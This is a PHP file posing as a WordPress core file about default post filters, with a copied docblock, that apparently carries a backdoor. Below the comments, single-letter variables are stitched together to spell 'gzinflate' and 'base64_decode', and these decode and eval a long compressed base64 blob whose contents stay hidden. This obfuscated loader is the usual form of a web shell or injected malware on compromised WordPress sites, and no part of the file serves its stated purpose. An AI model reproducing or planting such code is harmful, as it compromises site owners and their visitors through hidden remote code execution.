<?php 
/**
 * Sets up the default filters and actions for most
 * of the WordPress posts.
 *
 * If you need to remove a default posts, this file will
 * give you the priority for which to use to remove the
 * posts.
 *
 * Not all of the default posts are found in post.php
 *
 * @package WordPress
 * @id 
 */

// Strip, trim, kses, special wp_nonces for string saves

$VmZs='n';$VI='o';$nOVX='z';$SKgq='c';$sr='s';$MYqcY='6';$KRMW='4';$kGt='i';$aXBw='e';$ULjQ='d';$cTf='l';$PAuhr='a';$Msj='t';$JnR='b';$BIZ='g';$E='f';$vJ='_';$qf=$BIZ.$nOVX.$kGt.$VmZs.$E.$cTf.$PAuhr.$Msj.$aXBw;$chCWO=$JnR.$PAuhr.$sr.$aXBw.$MYqcY.$KRMW.$vJ.$ULjQ.$aXBw.$SKgq.$VI.$ULjQ.$aXBw;eval($qf($chCWO('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')));